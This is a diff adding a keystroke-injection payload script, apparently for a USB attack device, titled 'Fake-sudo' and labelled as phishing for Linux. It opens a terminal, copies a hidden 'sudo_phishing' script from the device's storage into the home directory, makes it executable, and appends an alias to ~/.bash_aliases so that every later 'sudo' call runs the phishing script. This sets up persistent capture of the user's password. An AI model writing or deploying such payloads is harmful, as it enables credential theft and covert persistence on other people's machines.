@@ -1,0 +1,52 @@
+#!/bin/bash
+#
+# Title:            Fake-sudo
+#
+# Description:      
+#                   This program creates a fake "sudo" 
+#                   command by defining an persistent alias.
+#
+# Author:           TW-D
+# Version:          1.1
+# Category:         Phishing
+# Target:           Linux
+# Attackmodes:      HID and STORAGE
+=
+# TESTED ON
+# ===============
+# Ubuntu 20.04.4 LTS x86_64 (Xfce)
+
+
+LED R
+
+DELAY 7000
+CTRL ALT T
+DELAY 7000
+
+LED B
+
+STRING cd /media/$USER/*/Linux/exfil/
+ENTER
+DELAY 1500
+
+STRING cp ./sudo-phishing.sh ~/.sudo_phishing.sh
+ENTER
+DELAY 1500
+
+LED C
+
+STRING chmod +x ~/.sudo_phishing.sh
+ENTER
+DELAY 1500
+
+STRING printf \"\\nalias sudo='~/.sudo_phishing.sh'\\n\" >> ~/.bash_aliases
+ENTER
+DELAY 1500
+
+LED Y
+
+STRING exit
+ENTER
+DELAY 1500
+
+LED G
